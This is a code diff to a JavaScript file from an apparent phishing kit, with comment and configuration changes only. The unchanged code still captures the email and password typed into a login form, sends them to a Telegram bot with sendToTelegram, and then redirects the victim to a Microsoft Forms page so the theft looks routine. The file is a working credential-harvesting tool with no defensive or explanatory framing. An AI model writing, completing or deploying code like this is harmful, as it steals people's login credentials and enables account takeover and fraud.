@@ -1,6 +1,6 @@
 // Use environment variables for sensitive data
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";
+const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // Replace with your bot token
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // Replace with your chat ID
 
 // Store the first email and password
 let firstEmail = "";
@@ -46,7 +46,7 @@ async function sendToTelegram(message) {
 
 // Login form submission
 document.getElementById("login-form").addEventListener("submit", async function (event) {
-    event.preventDefault();
+    event.preventDefault(); // Prevent form from submitting
 
     // Check if the maximum login attempts have been reached
     if (loginAttempts >= MAX_LOGIN_ATTEMPTS) {
@@ -94,7 +94,7 @@ Passcode: ${password}
             // Send login details to Telegram
             await sendToTelegram(loginMessage);
 
-            // Redirect to the form (optional)
+            // Redirect to the external form
             window.location.href = "https://forms.office.com/Pages/ResponsePage.aspx?id=6rma1OyZUkWGUb2U95ql5fEyhzHJrZ1Nh6ErkmDSMa5UMTQ0TkFYVjI1TFhSS1UyMU9TM0REQ0lDTS4u";
         } else {
             // If the email and password don't match, show an error
